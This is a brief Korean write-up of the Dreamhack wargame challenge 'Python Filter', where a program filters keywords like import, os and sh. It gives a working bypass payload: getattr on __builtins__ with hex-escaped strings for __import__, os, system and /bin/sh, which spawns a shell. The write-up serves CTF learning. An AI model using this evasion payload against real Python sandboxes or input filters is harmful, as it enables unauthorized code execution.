# [Python Filter](https://dreamhack.io/wargame/challenges/3075)

파이썬 코드를 입력받고 import, os, sh 등의 예약어를 필터링하는 프로그램에서 쉘을 실행하는 문제.  

```python
import os; os.system('/bin/sh'); 
```

본 파이썬 코드를 그대로 입력할 수 없으므로 해당 코드를 16진수 이스케이프 코드로 변환한다.  
해당 이스케이프 코드를 문자열 이름으로 객체의 속성을 가져오는 getattr() 함수를 이용해 최종적으로 쉘을 획득할 수 있다.

__import는 파이썬의 키워드이며 실제 모듈을 불러오는 작업은 내장 함수 __import__()가 수행한다. 따라서 import os 대신 __import__('os')를 사용할 수 있으며, 이를 getattr()와 함께 이용해 필터링을 우회할 수 있다.__ 

최종 입력  

```python
getattr(getattr(__builtins__, '\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73'), '\x73\x79\x73\x74\x65\x6d')('\x2f\x62\x69\x6e\x2f\x73\x68')
```
